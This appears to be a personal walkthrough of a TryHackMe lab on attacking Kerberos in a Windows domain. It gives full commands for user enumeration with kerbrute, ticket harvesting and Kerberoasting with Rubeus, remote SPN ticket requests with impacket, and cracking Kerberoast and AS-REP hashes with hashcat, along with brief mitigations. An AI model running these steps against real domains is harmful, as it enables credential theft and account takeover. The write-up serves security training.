# [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller

6/25/2022
## Summary:

- Mitigation: Have a strong password policy (hashes will take longer to crack), Don't turn off Kerberos Pre-Authentication unless it's necessary, Don't let your domain admins log onto anything except the domain controller

## Kerbrute

- First, we will use [kerbrute](https://github.com/ropnop/kerbrute/releases) to enumerate the users on the domain
- `./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`
- Wordlist: https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt

![image](https://user-images.githubusercontent.com/66894542/175787532-814cf50f-6c1d-4cfa-9f23-09de67c8bb50.png)

## [Rubeus](https://github.com/GhostPack/Rubeus)
- To harvest tickets that we can use later for a pass the ticket attack, we can use the following command:
- `Rubeus.exe harvest /interval:30`

- We get both domain controller and admin tickets:

![image](https://user-images.githubusercontent.com/66894542/175787837-84266d08-5f15-443b-a694-5152a202997f.png)
![image](https://user-images.githubusercontent.com/66894542/175787958-f8005af5-ae6c-4acd-9b39-9cf7d0677845.png)


- We can also use a password spray attack that uses one password to spray across many different users:

![image](https://user-images.githubusercontent.com/66894542/175787911-624d9541-420e-4038-a8b8-a10d82d9728e.png)


## Kerberoasting
- "request a service ticket for any service with a registered SPN then use that ticket to crack the service password"
- "depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account."

- `Rubeus.exe kerberoast`

![image](https://user-images.githubusercontent.com/66894542/175788374-f93b2e68-3fa5-405f-baff-1add0204d72e.png)

- Unfortunately the output has a lot of spaces so I used `sed 's/[[:space:]]//g' hash.txt` and deleted the new lines manually to get it to be one line of text (home and backspace)
- `hashcat -m 13100 -a 0 hash.txt Pass.txt`

![image](https://user-images.githubusercontent.com/66894542/175789281-fbce4710-932f-4152-ae01-ca25ca1b3a03.png)


- We can also do this remotely with impacket:
- `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.161 -request`

## AS-REP Roasting
`hashcat -m 18200 hash.txt Pass.txt`
![image](https://user-images.githubusercontent.com/66894542/175791160-c96c6c0d-0f82-410d-9848-11b075671732.png)


![image](https://user-images.githubusercontent.com/66894542/175791467-1f365a83-20da-4b67-8c3d-83b749d83e43.png)
